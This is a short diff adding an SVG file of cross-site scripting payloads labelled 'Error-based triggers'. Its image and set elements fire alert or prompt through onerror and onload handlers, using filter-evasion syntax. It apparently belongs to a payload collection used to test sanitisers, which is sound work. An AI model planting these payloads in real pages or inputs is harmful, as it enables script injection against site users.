@@ -1,0 +1,7 @@
+<!-- Payload 4: Error-based triggers -->
+<svg version="1.1" xmlns="http://www.w3.org/2000/svg">
+    <image href="x" onError="`${x}`;alert(`Ex.Mi`);">
+    <image src=x onerror=.1|alert``>
+    <image ignored=() src=x onerror=prompt(1)>
+    <set attributeName="onload" to="alert(domain)"/>
+</svg>
